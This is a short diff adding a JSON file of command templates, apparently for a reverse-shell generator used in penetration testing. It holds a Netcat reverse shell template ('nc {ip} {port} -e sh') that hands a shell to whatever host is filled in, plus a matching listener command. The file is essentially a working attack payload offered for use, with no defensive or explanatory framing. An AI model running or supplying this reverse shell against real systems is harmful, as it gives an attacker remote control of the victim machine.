@@ -1,0 +1,13 @@
+{
+  "commands": [
+    {
+      "title": "Netcat -e reverse shell",
+      "template": "nc {ip} {port} -e sh",
+      "description": "Uses Netcat's -e option to directly execute /bin/sh upon connection."
+    },
+    {
+      "title": "Netcat Listener",
+      "template": "nc -lvnp {port}"
+    }
+  ]
+}
